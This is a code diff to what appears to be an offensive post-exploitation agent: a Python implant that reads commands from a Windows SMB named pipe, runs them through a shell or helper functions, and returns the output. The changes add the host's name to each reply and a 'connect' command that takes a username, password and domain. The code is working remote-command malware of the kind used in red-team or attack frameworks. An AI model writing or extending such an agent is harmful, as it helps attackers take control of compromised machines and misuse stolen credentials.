@@ -4,6 +4,7 @@ import time
 import logging
 import subprocess
 from multiprocessing import Process, Pipe
+import socket
 
 import win32pipe
 import win32file
@@ -22,13 +23,13 @@ from utils.winapi.run import run_process
 from utils.winapi.netexec import load_dotnet_assembly
 from utils.config import PIPENAME
 
-#PIPE_NAME = r'\\.\pipe\smb_pipe'
-
 logging.basicConfig(level=logging.INFO)
+
+def get_hostname():
+    return socket.gethostname()
 
 def handle_command(command):
     try:
-        # Parsing and handling different commands using common library functions
         if command.startswith("ls"):
             path = command.split(' ', 1)[1]
             result = ls(path)
@@ -70,7 +71,6 @@ def handle_command(command):
         else:
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
 
-        # Ensure the result is a string
         if isinstance(result, list):
             result = "\n".join(result)
         return result
@@ -102,10 +102,23 @@ def smb_agent(pipe_conn):
                     if command.lower() == 'disconnect':
                         logging.info("Disconnect command received.")
                         win32file.CloseHandle(handle)
-                        break  # Exit inner while loop to wait for new connection
+                        break
+
+                    if command.lower().startswith('connect'):
+                        logging.info(f"Handling connect command with details: {command}")
+                        parts = command.split()
+                        if len(parts) > 1:
+                            username = parts[1]
+                        if len(parts) > 2:
+                            password = parts[2]
+                        if len(parts) > 3:
+                            domain = parts[3]
+                        continue
 
                     result = handle_command(command)
-                    win32file.WriteFile(handle, result.encode('utf-8'))
+                    hostname = get_hostname()
+                    response = f"{hostname}\n{result}"  # Include hostname in the response
+                    win32file.WriteFile(handle, response.encode('utf-8'))
                 except pywintypes.error as e:
                     logging.error(f"Pipe read/write error: {e}")
                     break
